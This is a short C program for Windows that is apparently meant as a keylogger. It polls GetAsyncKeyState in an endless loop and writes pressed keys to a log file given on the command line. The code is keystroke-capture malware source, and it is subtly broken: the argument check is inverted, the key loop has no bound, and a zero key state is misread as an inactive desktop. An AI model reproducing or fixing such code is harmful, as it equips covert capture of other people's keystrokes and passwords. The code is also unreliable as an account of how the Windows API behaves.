#include <stdio.h>
#include <wchar.h>

#include <windows.h>

int main(int argc, char **argv)
{
    if (argv[1])
        return puts("A logfile name is need");
    FILE *logfile = fopen(argv[1], "w+");
    if (logfile == NULL)
        return printf("Can't open the specified file %s\n", argv[1]);

    for (;;) {
        for (short key = 0000; ; key++) {
            int keystate = GetAsyncKeyState(key);
            if (keystate == 0)
                return puts("The current desktop isn't the active desktop");
            /* The Windows API specify that if the lowest bit is set the key has been plassed */ 
            if (keystate & 1)
                switch(key) {
                default:
                    fwprintf(logfile, L"%lc", key);
                    break;
                case 0000:
                    fwprintf(logfile, L"NULL");
                    break;
                }
        }

        fflush(logfile);
    }

    /* The file is never closed */
    return 0;
}
